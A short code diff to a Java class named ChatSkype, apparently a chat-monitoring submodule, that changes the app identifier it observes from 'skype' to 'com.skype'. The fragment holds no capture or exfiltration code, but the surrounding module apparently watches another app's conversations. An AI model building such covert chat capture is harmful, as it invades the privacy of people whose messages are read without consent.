@@ -33,7 +33,7 @@ public class ChatSkype extends SubModuleChat {
 	private static final String TAG = "ChatSkype";
 
 	private static final int PROGRAM = 0x01;
-	String pObserving = "skype";
+	String pObserving = "com.skype";
 
 	private Date lastTimestamp;
 
